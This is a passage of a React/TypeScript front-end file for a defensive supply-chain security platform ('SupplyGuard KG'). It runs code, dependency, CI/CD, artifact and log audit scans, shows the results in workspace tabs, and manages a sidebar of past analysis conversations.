      const audit = await runCodeAuditScan({
        workspaceId,
        importId: newImportId,
        includeCheckov: true,
        timeoutSeconds: 180,
      })
      const nextWorkspace = await loadSecurityWorkspaceById(workspaceId)
      applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
      toast.success(`补充文件已纳入代码审查，发现 ${audit.summary.total} 项风险`)
    } else if (targetTab === 'supply') {
      const audit = await runDependencyAuditScan({ workspaceId, importId: newImportId })
      const nextWorkspace = await loadSecurityWorkspaceById(workspaceId)
      applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
      toast.success(supplementFileSuccessMessage('reachability'))
    } else if (targetTab === 'pipeline') {
      const audit = await runCICDAuditScan({ workspaceId, importId: newImportId })
      const nextWorkspace = await loadSecurityWorkspaceById(workspaceId)
      applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
      toast.success(supplementFileSuccessMessage('cicd', { count: audit.summary.finding_count }))
    }
  }

  async function startFullAnalysis() {
    if (!workspace) return
    const workspaceId = workspace.workspaceId || workspace.workspace?.workspaceId
    const importId = workspace.workspace?.importId || workspace.import?.importId
    if (!workspaceId || !importId) {
      toast.error('当前对话缺少 workspaceId 或 importId，请重新导入项目')
      return
    }
    const activeWorkspaceId = workspaceId
    const activeImportId = importId
    const runningEntry = Object.entries(scanStateByWorkspace).find(
      ([id, state]) => id !== activeWorkspaceId && state.running
    )
    if (runningEntry) {
      const runningConversation = conversations.find((item) => item.workspaceId === runningEntry[0])
      toast.warning(`${runningConversation?.title || '另一个项目'}还未完成扫描，请等待它结束后再启动新的扫描`)
      return
    }

    setWorkspaceScanState(activeWorkspaceId, {
      running: true,
      completed: false,
      steps: scanStepSeed.map((step) => ({ ...step })),
    })
    const errors: Array<{ module: string; message: string }> = []

    const updateStep = (id: ScanStepState['id'], status: ScanStepStatus, message: string) => {
      setWorkspaceScanState(activeWorkspaceId, (state) =>
        ({
          ...state,
          steps: state.steps.map((step) =>
            step.id === id ? { ...step, status, message } : step
          ),
        })
      )
    }

    async function refreshCurrentWorkspace() {
      const nextWorkspace = await loadSecurityWorkspaceById(activeWorkspaceId)
      if (activeWorkspaceRef.current === activeWorkspaceId) {
        applyWorkspaceUpdate(nextWorkspace)
      }
      return nextWorkspace
    }

    async function runStep(
      id: ScanStepState['id'],
      label: string,
      task: () => Promise<unknown>
    ) {
      updateStep(id, 'running', '正在扫描')
      try {
        await task()
        await refreshCurrentWorkspace()
        updateStep(id, 'completed', '扫描完成')
      } catch (error) {
        const message = error instanceof Error ? error.message : `${label} 扫描失败`
        errors.push({ module: label, message })
        updateStep(id, 'failed', message)
      }
    }

    await runStep('code', '代码审查', () =>
      runCodeAuditScan({ workspaceId: activeWorkspaceId, importId: activeImportId, timeoutSeconds: 180, includeCheckov: false })
    )
    await runStep('supply', '供应链', () =>
      runDependencyAuditScan({
        workspaceId: activeWorkspaceId,
        importId: activeImportId,
        includeOsv: true,
        includeCdxgen: false,
        includeCyclonedxPy: false,
      })
    )
    await runStep('pipeline', 'CI/CD 链路', () =>
      runCICDAuditScan({ workspaceId: activeWorkspaceId, importId: activeImportId })
    )

    updateStep('artifact', 'running', '正在自动发现 artifact 与 provenance')
    updateStep('logs', 'running', '正在自动发现运行期日志')
    updateStep('multimodal', 'skipped', '未上传外部告警证据')
    updateStep('graph', 'running', '正在汇总证据')

    try {
      const nextWorkspace = await runWorkspaceScanSuite(activeWorkspaceId, {
        importId: activeImportId,
        includeCodeAudit: false,
        includeDependencyAudit: false,
        includeCicdAudit: false,
        includeArtifactTrust: true,
        includeLogAudit: true,
      })
      const scanSuiteErrors = nextWorkspace.scanSuite?.errors ?? []
      errors.push(...scanSuiteErrors.map((item) => ({
        module: item.module,
        message: item.message,
      })))
      if (activeWorkspaceRef.current === activeWorkspaceId) {
        applyWorkspaceUpdate(nextWorkspace, {
          scanState: scanStateFromWorkspace(nextWorkspace),
          refreshModules: true,
        })
      }
      updateStep(
        'artifact',
        nextWorkspace.artifact_trust?.scan_id ? 'completed' : 'skipped',
        nextWorkspace.artifact_trust?.scan_id ? '扫描完成' : '缺少 artifact 与 provenance 材料'
      )
      updateStep(
        'logs',
        nextWorkspace.log_audit?.scan_id ? 'completed' : 'skipped',
        nextWorkspace.log_audit?.scan_id ? '扫描完成' : '缺少运行期日志文件'
      )
      updateStep('graph', scanSuiteErrors.length ? 'failed' : 'completed', scanSuiteErrors.length ? '汇总时出现错误' : '图谱与报告已更新')
    } catch (error) {
      const message = error instanceof Error ? error.message : '图谱与报告汇总失败'
      errors.push({ module: '图谱与报告', message })
      updateStep('graph', 'failed', message)
    } finally {
      setWorkspaceScanState(activeWorkspaceId, (state) => ({
        ...state,
        running: false,
        completed: true,
      }))
      if (errors.length) {
        toast.warning(`扫描完成，${errors.length} 个模块需要处理`)
      } else {
        toast.success('完整扫描已完成，模块入口已解锁')
      }
    }
  }

  if (loading) {
    return (
      <div className='flex min-h-svh items-center justify-center gap-3 text-muted-foreground'>
        <Loader2 className='size-5 animate-spin' />
        正在加载供应链安全态势
      </div>
    )
  }

  const activeConversation = conversations.find(
    (item) => item.conversationId === activeConversationId
  )

  return (
    <div className='security-platform min-h-svh bg-background'>
      <Header
        fixed
        className='border-b bg-[color:var(--surface-shell)]/95 shadow-[var(--shadow-soft)] backdrop-blur'
        sidebarTrigger={
          <Button
            type='button'
            variant='outline'
            size='icon'
            className='size-9 rounded-lg'
            onClick={() => setSidebarCollapsed((value) => !value)}
            title={sidebarCollapsed ? '展开对话侧边栏' : '收起对话侧边栏'}
            aria-label={sidebarCollapsed ? '展开对话侧边栏' : '收起对话侧边栏'}
          >
            {sidebarCollapsed ? <PanelLeftOpen className='size-4' /> : <PanelLeftClose className='size-4' />}
          </Button>
        }
      >
        <div className='flex min-w-0 flex-1 items-center justify-between gap-4'>
          <div className='flex min-w-0 items-center gap-2'>
            <Logo className='size-7 shrink-0' />
            <div className='min-w-0'>
              <div className='truncate text-sm font-semibold'>SupplyGuard KG</div>
              <div className='truncate text-xs text-muted-foreground'>
                {workspace
                  ? `${workspace.workspace.repository} · ${workspace.workspace.commit}`
                  : draftConversation
                    ? '新建对话 · 等待导入项目'
                    : '历史对话 · 选择或新建项目分析'}
              </div>
            </div>
          </div>
          <div className='flex shrink-0 items-center gap-2'>
            <ThemeSwitch />
            <Button
              variant='outline'
              size='sm'
              onClick={() => {
                if (activeConversation?.workspaceId) {
                  void loadWorkspace(activeConversation.workspaceId, true)
                } else {
                  void loadConversationList(activeConversationId)
                }
              }}
              disabled={refreshing || (!workspace && !activeConversation)}
            >
              {refreshing ? (
                <Loader2 className='animate-spin' />
              ) : (
                <RefreshCw />
              )}
              刷新
            </Button>
          </div>
        </div>
      </Header>

      <Main fluid className='p-0'>
        <div className={cn('grid h-[calc(100svh-4rem)] min-h-0 transition-[grid-template-columns] duration-300', sidebarCollapsed ? 'lg:grid-cols-[minmax(0,1fr)]' : 'lg:grid-cols-[292px_minmax(0,1fr)]')}>
          {!sidebarCollapsed ? (
            <AgentProjectSidebar
              conversations={conversations}
              activeConversationId={activeConversationId}
              draftActive={draftConversation}
              scanStateByWorkspace={scanStateByWorkspace}
              onNewConversation={startDraftConversation}
              onSelect={(conversation) => void selectConversation(conversation)}
              onDelete={(conversationId) => void removeConversation(conversationId)}
              onRename={(conversationId, title) => void updateConversationTitle(conversationId, title)}
            />
          ) : null}

          <Tabs
            value={activeWorkspaceTab.module}
            onValueChange={(value) => {
              if (isPlatformTab(value)) openWorkspaceTab(value)
            }}
            className={cn('flex min-h-0 min-w-0 flex-col bg-[color:var(--surface-shell)]', !sidebarCollapsed && 'border-l')}
          >
            <WorkspaceTabs
              tabs={openTabs}
              activeTabId={activeWorkspaceTab.id}
              onSelect={(tab) => openWorkspaceTab(tab)}
              onClose={closeWorkspaceTab}
            />

            <div ref={contentScrollRef} className='min-h-0 flex-1 overflow-y-scroll overscroll-contain p-4 [scrollbar-gutter:stable] sm:p-5'>
              <TabsContent value='overview' className='m-0'>
                <WorkbenchMotionLayer motionKey={`overview-${moduleViewKey}-${workspaceDataKey}`}>
                  {workspace ? (
                    <AgentConversationHome
                      workspace={workspace}
                      analysisStarted={analysisStarted}
                      scanRunning={scanRunning}
                      scanSteps={scanSteps}
                      question={question}
                      setQuestion={setQuestion}
                      attachments={assistantAttachments}
                      attachmentBusy={assistantAttachmentBusy}
                      onAddAttachments={(files) => void addAssistantAttachments(files)}
                      onRemoveAttachment={(id) => setAssistantAttachments((current) => current.filter((item) => item.attachmentId !== id))}
                      assistantMode={assistantMode}
                      onAssistantModeChange={setAssistantMode}
                      messages={assistantMessages}
                      busy={assistantBusy}
                      onSubmit={() => void submitQuestion()}
                      onStartAnalysis={() => void startFullAnalysis()}
                      onOpenModule={(module) => openWorkspaceTab(module)}
                    />
                  ) : (
                    <AgentConversationEmpty
                      draftActive={draftConversation}
                      onNewConversation={startDraftConversation}
                      onImported={(record) => void bindImportToConversation(record)}
                    />
                  )}
                </WorkbenchMotionLayer>
              </TabsContent>

              {workspace ? (
                <>
          <TabsContent value='code' className={moduleTabContentClass}>
            <WorkbenchMotionLayer motionKey={`code-${moduleViewKey}-${workspaceDataKey}`}>
            <CodeAuditPanel
              workspace={workspace}
              workspaceId={workspace.workspaceId || workspace.workspace?.workspaceId}
              importId={workspace.code_audit?.target?.importId ?? workspace.workspace?.importId}
              onScanned={async (audit) => {
                setWorkspace((current) => current ? { ...current, code_audit: audit } : { ...workspace, code_audit: audit })
                const nextWorkspace = await loadSecurityWorkspaceById(getWorkspaceId(workspace))
                applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
                toast.success(`代码审查完成，发现 ${audit.summary.total} 项风险`)
              }}
              onSupplementProjectArchive={(file) => supplementProjectArchive(file, 'code')}
            />
            </WorkbenchMotionLayer>
          </TabsContent>

          <TabsContent value='supply' className={moduleTabContentClass}>
            <WorkbenchMotionLayer motionKey={`supply-${moduleViewKey}-${workspaceDataKey}`}>
            <SupplyReachabilityPanel
              workspace={workspace}
              workspaceId={workspace.workspaceId || workspace.workspace?.workspaceId}
              importId={workspace.dependency_audit?.target?.importId ?? workspace.code_audit?.target?.importId}
              onCodeScanned={async (audit) => {
                setWorkspace((current) => current ? { ...current, code_audit: audit } : { ...workspace, code_audit: audit })
                const nextWorkspace = await loadSecurityWorkspaceById(getWorkspaceId(workspace))
                applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
                toast.success(`可达性研判完成，发现 ${audit.summary.total} 项风险`)
              }}
              onDependencyScanned={async (audit) => {
                setWorkspace((current) => {
                  const base = current ?? workspace
                  return {
                  ...base,
                  dependency_audit: audit,
                  dependencies: audit.dependencies,
                  findings: [
                    ...audit.findings.map((finding) => ({
                      id: finding.id,
                      title: finding.title,
                      module: '供应链',
                      severity: finding.severity,
                      score: finding.score,
                      asset: `${finding.ecosystem}:${finding.dependency} (${finding.source_file})`,
                      evidence: finding.evidence,
                      first_seen: formatLocalDateTime(audit.generated_at, { fallback: '' }),
                      owner: 'appsec',
                      status: finding.recommendation,
                    })),
                    ...(base.findings ?? []).filter(
                      (finding) =>
                        !finding.module.includes('供应链') &&
                        !finding.module.includes('供应链')
                    ),
                  ],
                  summary: {
                    ...base.summary,
                    dependencies: audit.summary.total_dependencies,
                    risk_score: Math.max(base.summary.risk_score, audit.summary.risk_score),
                  },
                }
                })
                const nextWorkspace = await loadSecurityWorkspaceById(getWorkspaceId(workspace))
                applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
                toast.success(supplementFileSuccessMessage('reachability'))
              }}
              onSupplementProjectArchive={(file) => supplementProjectArchive(file, 'supply')}
              animationKey={moduleViewKey}
            />
            </WorkbenchMotionLayer>
          </TabsContent>

          <TabsContent value='pipeline' className={moduleTabContentClass}>
            <WorkbenchMotionLayer motionKey={`pipeline-${moduleViewKey}-${workspaceDataKey}`}>
            <ModuleQuestion
              title='本页在回答什么问题？'
              question='风险是否进入了 CI/CD 构建流程，并影响 workflow、runner 或发布链路？'
              terms={['未固定 Action', 'self-hosted runner', 'SARIF']}
            />
            <PipelinePanel
              pipeline={workspace.pipeline ?? []}
              audit={workspace.cicd_audit}
              artifactTrust={workspace.artifact_trust}
              workspaceId={workspace.workspaceId || workspace.workspace?.workspaceId}
              importId={workspace.cicd_audit?.target?.importId ?? workspace.code_audit?.target?.importId}
              onScanned={async (audit) => {
                setWorkspace({
                  ...workspace,
                  cicd_audit: audit,
                  findings: [
                    ...audit.findings.map((finding) => ({
                      id: finding.id,
                      title: finding.title,
                      module: 'CI/CD',
                      severity: finding.severity,
                      score: finding.score,
                      asset: `${finding.workflow}:${finding.line}`,
                      evidence: finding.evidence,
                      first_seen: formatLocalDateTime(audit.generated_at, { fallback: '' }),
                      owner: 'devops',
                      status: finding.recommendation,
                    })),
                    ...(workspace.findings ?? []).filter((finding) => !finding.module.includes('CI/CD')),
                  ],
                  summary: {
                    ...workspace.summary,
                    build_steps: audit.summary.total_steps,
                    risk_score: Math.max(workspace.summary.risk_score, audit.summary.risk_score),
                  },
                })
                const nextWorkspace = await loadSecurityWorkspaceById(getWorkspaceId(workspace))
                applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
                toast.success(supplementFileSuccessMessage('cicd', { count: audit.summary.finding_count }))
              }}
              onSupplementProjectArchive={(file) => supplementProjectArchive(file, 'pipeline')}
            />
            </WorkbenchMotionLayer>
          </TabsContent>

          <TabsContent value='artifact' className={moduleTabContentClass}>
            <WorkbenchMotionLayer motionKey={`artifact-${moduleViewKey}-${workspaceDataKey}`}>
            <ArtifactTrustPanel
              result={workspace.artifact_trust}
              workspaceId={workspace.workspaceId || workspace.workspace?.workspaceId}
              onScanned={async (result) => {
                setWorkspace(applyArtifactTrustToWorkspace(workspace, result))
                const nextWorkspace = await loadSecurityWorkspaceById(getWorkspaceId(workspace))
                applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
                toast.success(supplementFileSuccessMessage('artifact', { score: artifactTrustScore(result) }))
              }}
            />
            </WorkbenchMotionLayer>
          </TabsContent>

          <TabsContent value='logs' className={moduleTabContentClass}>
            <WorkbenchMotionLayer motionKey={`logs-${moduleViewKey}-${workspaceDataKey}`}>
            <ModuleQuestion
              title='本页在回答什么问题？'
              question='运行期是否出现与前面供应链风险一致的异常外联、敏感接口访问或探测行为？'
              terms={['日志印证', '异常外联', '证据窗口']}
            />
            <LogsPanel
              logs={workspace.logs ?? []}
              audit={workspace.log_audit}
              workspaceId={workspace.workspaceId || workspace.workspace?.workspaceId}
              onRealtimeChanged={async () => {
                const nextWorkspace = await loadSecurityWorkspaceById(getWorkspaceId(workspace))
                applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
              }}
              onScanned={async (audit) => {
                setWorkspace(applyLogAuditToWorkspace(workspace, audit))
                const nextWorkspace = await loadSecurityWorkspaceById(getWorkspaceId(workspace))
                applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
                toast.success(`日志扫描完成，发现 ${audit.summary.finding_count} 项运行期风险`)
              }}
            />
            </WorkbenchMotionLayer>
          </TabsContent>

          <TabsContent value='multimodal' className={moduleTabContentClass}>
            <WorkbenchMotionLayer motionKey={`multimodal-${moduleViewKey}-${workspaceDataKey}`}>
            <ModuleQuestion
              title='本页在回答什么问题？'
              question='外部告警截图、语音或视频帧中是否包含可关联到依赖、IP、接口或服务的证据？'
              terms={['OCR', 'ASR', '证据缺口']}
            />
            <MultimodalEvidencePanel
              result={workspace.multimodal_audit}
              workspaceId={workspace.workspaceId || workspace.workspace?.workspaceId}
              onScanned={async (result) => {
                setWorkspace(applyMultimodalAuditToWorkspace(workspace, result))
                const nextWorkspace = await loadSecurityWorkspaceById(getWorkspaceId(workspace))
                applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
                toast.success(`多模态证据已接入 ${result.summary.evidence_count} 条`)
              }}
            />
            </WorkbenchMotionLayer>
          </TabsContent>

          <TabsContent value='graph' className='m-0 h-full min-h-[640px]'>
            <WorkbenchMotionLayer
              motionKey={`graph-${moduleViewKey}-${workspaceDataKey}`}
              className='h-full min-h-0'
            >
            <AttackChainGraph workspace={workspace} />
            </WorkbenchMotionLayer>
          </TabsContent>

          <TabsContent value='copilot' className={moduleTabContentClass}>
            <WorkbenchMotionLayer motionKey={`copilot-${moduleViewKey}-${workspaceDataKey}`}>
            <ModuleQuestion
              title='本页在回答什么问题？'
              question='Agent 能否自动执行调查、解释判断依据、指出证据缺口并给出处置优先级？'
              terms={['Agent', '证据缺口', '工具调用']}
            />
            <CopilotPanel
              workspace={workspace}
              question={question}
              setQuestion={setQuestion}
              attachments={assistantAttachments}
              attachmentBusy={assistantAttachmentBusy}
              onAddAttachments={(files) => void addAssistantAttachments(files)}
              onRemoveAttachment={(id) => setAssistantAttachments((current) => current.filter((item) => item.attachmentId !== id))}
              assistantMode={assistantMode}
              onAssistantModeChange={setAssistantMode}
              messages={assistantMessages}
              busy={assistantBusy}
              onSubmit={() => void submitQuestion()}
              onWorkspaceUpdated={(nextWorkspace) => {
                applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
              }}
            />
            </WorkbenchMotionLayer>
          </TabsContent>

          <TabsContent value='report' className={moduleTabContentClass}>
            <WorkbenchMotionLayer motionKey={`report-${moduleViewKey}-${workspaceDataKey}`}>
            <ModuleQuestion
              title='本页在回答什么问题？'
              question='如何把结论、证据链、攻击路径和处置建议交付给评委或安全团队？'
              terms={['Markdown', '证据包', '防御性声明']}
            />
            <ReportPanel workspace={workspace} animationKey={moduleViewKey} onOpenModule={(module) => openWorkspaceTab(module)} />
            </WorkbenchMotionLayer>
          </TabsContent>
                </>
              ) : null}
            </div>
        </Tabs>
        </div>
      </Main>
    </div>
  )
}

function AgentProjectSidebar({
  conversations,
  activeConversationId,
  draftActive,
  scanStateByWorkspace,
  onNewConversation,
  onSelect,
  onDelete,
  onRename,
}: {
  conversations: SecurityConversation[]
  activeConversationId: string
  draftActive: boolean
  scanStateByWorkspace: Record<string, ScanWorkspaceState>
  onNewConversation: () => void
  onSelect: (conversation: SecurityConversation) => void
  onDelete: (conversationId: string) => void
  onRename: (conversationId: string, title: string) => void
}) {
  const [query, setQuery] = useState('')
  const searchInputRef = useRef<HTMLInputElement>(null)
  const normalizedQuery = query.trim().toLocaleLowerCase('zh-CN')
  const filteredConversations = useMemo(() => {
    if (!normalizedQuery) return conversations
    return conversations.filter((conversation) =>
      [conversation.title, conversation.projectName, conversation.sourcePath]
        .filter(Boolean)
        .some((value) => String(value).toLocaleLowerCase('zh-CN').includes(normalizedQuery))
    )
  }, [conversations, normalizedQuery])

  useEffect(() => {
    const focusSearch = (event: KeyboardEvent) => {
      if ((event.ctrlKey || event.metaKey) && event.key.toLowerCase() === 'k') {
        event.preventDefault()
        searchInputRef.current?.focus()
      }
    }
    window.addEventListener('keydown', focusSearch)
    return () => window.removeEventListener('keydown', focusSearch)
  }, [])

  return (
    <aside className='flex min-h-[calc(100svh-4rem)] min-w-0 flex-col border-r border-border bg-[color:var(--surface-shell)]'>
      <div className='space-y-2 border-b border-border p-3'>
        <div className='group relative'>
          <Search className='pointer-events-none absolute left-3 top-1/2 size-4 -translate-y-1/2 text-muted-foreground transition-colors group-focus-within:text-cyan-600 dark:group-focus-within:text-cyan-300' />
          <Input
            ref={searchInputRef}
            value={query}
            onChange={(event) => setQuery(event.target.value)}
            placeholder='搜索项目或路径'
            aria-label='搜索历史对话'
            className='h-10 rounded-md border-border bg-[color:var(--surface-card)] pl-9 pr-14 text-sm shadow-sm focus-visible:border-cyan-400/60 focus-visible:ring-cyan-400/20'
          />
          {query ? (
            <Button
              type='button'
              variant='ghost'
              size='icon'
              className='absolute right-1 top-1/2 size-8 -translate-y-1/2 rounded-md text-muted-foreground hover:text-foreground'
              onClick={() => {
                setQuery('')
                searchInputRef.current?.focus()
              }}
              aria-label='清除搜索'
            >
              <X className='size-3.5' />
            </Button>
          ) : (
            <kbd className='pointer-events-none absolute right-2.5 top-1/2 -translate-y-1/2 rounded border border-border bg-[color:var(--surface-inset)] px-1.5 py-0.5 text-[10px] font-medium text-muted-foreground'>
              Ctrl K
            </kbd>
          )}
        </div>
        <Button
          variant='outline'
          className='group h-10 w-full justify-start gap-2 rounded-md border-border bg-[color:var(--surface-card)] px-3 text-sm font-semibold shadow-sm hover:border-cyan-400/45 hover:bg-cyan-400/10 hover:text-foreground'
          onClick={onNewConversation}
        >
          <span className='grid size-6 place-items-center rounded border border-cyan-400/25 bg-cyan-400/10 text-cyan-700 dark:text-cyan-200'>
            <Plus className='size-3.5 transition-transform duration-200 group-hover:rotate-90' />
          </span>
          新建对话
        </Button>
      </div>

      <div className='flex-1 overflow-y-auto overscroll-contain p-2 [scrollbar-gutter:stable] [scrollbar-width:thin]'>
        <div className='mb-1 flex h-8 items-center justify-between px-2 text-xs font-medium text-muted-foreground'>
          <span>历史对话</span>
          <span className='min-w-6 rounded-full border border-border bg-[color:var(--surface-inset)] px-1.5 py-0.5 text-center text-[10px] tabular-nums'>
            {normalizedQuery ? `${filteredConversations.length}/${conversations.length}` : conversations.length}
          </span>
        </div>

        {draftActive ? (
          <div className='mb-1 flex min-h-14 items-center gap-2 rounded-md border border-cyan-400/45 bg-cyan-400/10 px-3 shadow-sm'>
            <span className='size-2 shrink-0 rounded-full bg-cyan-500 shadow-[0_0_0_4px_rgba(6,182,212,0.12)]' />
            <div className='min-w-0'>
              <div className='truncate text-sm font-semibold text-foreground'>新建溯源对话</div>
              <div className='truncate text-xs text-muted-foreground'>等待导入项目</div>
            </div>
          </div>
        ) : null}

        <div className='space-y-1'>
        {filteredConversations.length ? (
          filteredConversations.map((conversation) => (
            <ConversationHistoryCard
              key={conversation.conversationId}
              conversation={conversation}
              active={conversation.conversationId === activeConversationId}
              scanState={scanStateByWorkspace[conversation.workspaceId]}
              onSelect={() => onSelect(conversation)}
              onDelete={() => onDelete(conversation.conversationId)}
              onRename={(title) => onRename(conversation.conversationId, title)}
            />
          ))
        ) : normalizedQuery ? (
          <div className='rounded-md border border-dashed border-border px-3 py-8 text-center'>
            <Search className='mx-auto mb-2 size-5 text-muted-foreground/60' />
            <div className='text-sm font-medium text-foreground'>未找到相关项目</div>
            <div className='mt-1 text-xs text-muted-foreground'>尝试搜索项目名称或本地路径</div>
          </div>
        ) : !draftActive ? (
          <div className='rounded-md border border-dashed border-border px-3 py-8 text-center text-sm text-muted-foreground'>
            暂无历史对话，新建对话后导入项目开始分析。
          </div>
        ) : null}
        </div>
      </div>
    </aside>
  )
}

function scanStateFromConversation(conversation: SecurityConversation): ScanWorkspaceState {
  const scanned =
    isCompletedScanStatus(conversation.summary.scanStatus) ||
    conversation.summary.riskScore !== null && conversation.summary.riskScore !== undefined
  if (!scanned) return freshScanState()
  return {
    running: false,
    completed: true,
    steps: scanStepSeed.map((step) => {
      if (['artifact', 'logs', 'multimodal'].includes(String(step.id))) {
        return { ...step, status: 'skipped', message: '待补材料' }
      }
      return { ...step, status: 'completed', message: '扫描完成' }
    }),
  }
}

function ConversationProgressRing({ state }: { state: ScanWorkspaceState }) {
  const percent = scanProgressPercent(state.steps, state.running)
  const displayPercent = state.running ? Math.max(10, percent) : percent
  const tone = state.running
    ? 'text-cyan-600 dark:text-cyan-400'
    : state.completed
      ? 'text-emerald-600 dark:text-emerald-400'
      : 'text-muted-foreground/45'
  const dotTone = state.running
    ? 'bg-cyan-600 shadow-[0_0_8px_rgba(8,145,178,0.35)] dark:bg-cyan-400'
    : state.completed
      ? 'bg-emerald-600 dark:bg-emerald-400'
      : 'bg-muted-foreground/30'

  return (
    <div
      className={cn('relative grid size-6 shrink-0 place-items-center rounded-full', tone)}
      aria-label={`扫描进度约 ${percent}%`}
      title={`扫描进度约 ${percent}%`}
    >
      <div
        className={cn(
          'absolute inset-0 rounded-full transition-all duration-500',
          state.running && 'animate-spin'
        )}
        style={{
          background: `conic-gradient(currentColor ${displayPercent * 3.6}deg, hsl(var(--muted)) 0deg)`,
        }}
      >
        {state.running ? (
          <span className='absolute left-1/2 top-0 size-1.5 -translate-x-1/2 rounded-full bg-current' />
        ) : null}
      </div>
      <div className='absolute inset-[3px] rounded-full bg-[color:var(--surface-card)]' />
      <span className={cn('relative size-1.5 rounded-full transition-colors duration-300', dotTone)} />
    </div>
  )
}

function ConversationHistoryCard({
  conversation,
  active,
  scanState,
  onSelect,
  onDelete,
  onRename,
}: {
  conversation: SecurityConversation
  active: boolean
  scanState?: ScanWorkspaceState
  onSelect: () => void
  onDelete: () => void
  onRename: (title: string) => void
}) {
  const [editing, setEditing] = useState(false)
  const [title, setTitle] = useState(conversation.title)
  const reducedMotion = useReducedMotion()
  const restoredScanState = scanState ?? scanStateFromConversation(conversation)
  const scanned = restoredScanState.completed

  useEffect(() => setTitle(conversation.title), [conversation.title])

  const commitTitle = () => {
    const nextTitle = title.trim()
    setEditing(false)
    if (nextTitle && nextTitle !== conversation.title) {
      onRename(nextTitle)
    } else {
      setTitle(conversation.title)
    }
  }

  return (
    <motion.div
      layout={!reducedMotion}
      initial={false}
      transition={{ type: 'spring', stiffness: 420, damping: 34, mass: 0.7 }}
    >
      <div
        className={cn(
          'group relative overflow-hidden rounded-md border transition-[border-color,background-color,box-shadow] duration-200',
          'before:absolute before:inset-y-2 before:left-0 before:w-0.5 before:rounded-r-full before:bg-cyan-500 before:opacity-0 before:transition-opacity',
          active
            ? 'border-cyan-400/50 bg-cyan-400/10 shadow-sm before:opacity-100'
            : 'border-transparent bg-transparent hover:border-border hover:bg-[color:var(--surface-inset)]'
        )}
      >
        {editing ? (
          <div className='p-2.5 pl-3'>
            <Input
              value={title}
              onChange={(event) => setTitle(event.target.value)}
              onBlur={commitTitle}
              onKeyDown={(event) => {
                if (event.key === 'Enter') event.currentTarget.blur()
                if (event.key === 'Escape') {
                  setTitle(conversation.title)
                  setEditing(false)
                }
              }}
              className='h-9 rounded-md bg-[color:var(--surface-card)] text-sm'
              aria-label='编辑对话标题'
              autoFocus
            />
          </div>
        ) : (
          <button type='button' className='block w-full px-3 py-2.5 pr-11 text-left' onClick={onSelect}>
            <div className={cn('truncate text-sm font-semibold leading-5', active ? 'text-foreground' : 'text-foreground/85')}>
              {conversation.title}
            </div>
            <div className='mt-0.5 truncate text-xs text-muted-foreground'>
              {conversation.sourcePath || conversation.projectName || '项目路径未记录'}
            </div>
            {active ? (
              <motion.div
                className='mt-2 flex min-w-0 items-center gap-1.5 text-[10px]'
                initial={reducedMotion ? false : { opacity: 0, y: -4 }}
                animate={reducedMotion ? undefined : { opacity: 1, y: 0 }}
                transition={{ duration: 0.2, ease: workbenchMotionEase }}
              >
                <span className='rounded border border-border bg-[color:var(--surface-card)] px-1.5 py-0.5 text-muted-foreground'>
                  {scanned ? '风险' : '预检'} <strong className='font-semibold text-foreground'>{scanned ? conversation.summary.riskScore ?? '-' : compactNumber(conversation.summary.preflightFiles ?? 0)}</strong>
                </span>
                <span className='rounded border border-border bg-[color:var(--surface-card)] px-1.5 py-0.5 text-muted-foreground'>
                  {scanned ? '路径' : '依赖/CI'} <strong className='font-semibold text-foreground'>{scanned ? conversation.summary.attackPaths ?? 0 : `${conversation.summary.dependencyFiles ?? 0}/${conversation.summary.ciFiles ?? 0}`}</strong>
                </span>
              </motion.div>
            ) : null}
          </button>
        )}

        {!editing ? (
          <div className='absolute right-2 top-2'>
            <div className='transition-opacity duration-150 group-hover:opacity-0 group-focus-within:opacity-0'>
              <ConversationProgressRing state={restoredScanState} />
            </div>
            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button
                  type='button'
                  variant='ghost'
                  size='icon'
                  className='absolute inset-0 size-6 rounded-md bg-[color:var(--surface-card)] text-muted-foreground opacity-0 shadow-sm transition-opacity hover:text-foreground focus-visible:opacity-100 group-hover:opacity-100 group-focus-within:opacity-100 data-[state=open]:opacity-100'
                  aria-label={`管理对话：${conversation.title}`}
                >
                  <MoreHorizontal className='size-4' />
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align='end' className='w-36'>
                <DropdownMenuItem onSelect={() => setEditing(true)}>
                  <Pencil className='size-3.5' />
                  重命名
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem className='text-red-600 focus:text-red-600 dark:text-red-300 dark:focus:text-red-300' onSelect={onDelete}>
                  <Trash2 className='size-3.5' />
                  永久删除
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        ) : null}
      </div>
    </motion.div>
  )
}

function AgentConversationEmpty({
  draftActive,
  onNewConversation,
  onImported,
}: {
  draftActive: boolean
  onNewConversation: () => void
  onImported: (record: ProjectImportRecord) => void
}) {
  return (
    <div className='mx-auto flex min-h-[calc(100svh-9rem)] w-full max-w-4xl items-center justify-center'>
      <div className='w-full space-y-5'>
        <div className='space-y-3 text-center'>
          <Badge variant='outline' className='rounded-md'>
            APT 溯源对话
          </Badge>
          <h1 className='text-page-title'>
            新建一个项目分析对话
          </h1>
        </div>

        {!draftActive ? (
          <Card className='rounded-md'>
            <CardContent className='flex flex-col items-center gap-3 p-8'>
              <Button size='lg' className={actionButtonClass} onClick={onNewConversation}>
                <Plus className='size-4' />
                新建对话
              </Button>
            </CardContent>
          </Card>
        ) : (
          <EmbeddedProjectImportPanel onImported={onImported} />
        )}
      </div>
    </div>
  )
}

type EmbeddedImportBusyState = DemoPresetKey | 'upload' | 'git' | 'local' | null

function EmbeddedProjectImportPanel({
  onImported,
}: {
  onImported: (record: ProjectImportRecord) => void
}) {
  const [busy, setBusy] = useState<EmbeddedImportBusyState>(null)
  const [archive, setArchive] = useState<File | null>(null)
  const [gitUrl, setGitUrl] = useState('')
  const [gitRef, setGitRef] = useState('')
  const [projectFiles, setProjectFiles] = useState<File[]>([])
